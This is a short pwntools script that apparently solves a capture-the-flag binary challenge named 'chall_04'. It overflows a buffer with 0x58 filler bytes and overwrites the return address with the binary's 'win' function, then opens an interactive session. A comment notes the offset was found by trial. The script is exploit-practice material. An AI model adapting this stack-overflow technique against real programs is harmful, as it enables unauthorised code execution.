import pwn

pwn.context.arch = 'amd64'
elf = pwn.context.binary = pwn.ELF("./chall_04")

filler = 0x58 # doesn't line up with my own math but it works, need to look into

payload = b"A"*filler + pwn.p64(elf.sym.win)

p = pwn.process(elf.path)

p.recvuntil(b"Follow the compass and it'll point you in the right direction\n")

p.sendline(payload)

p.interactive()
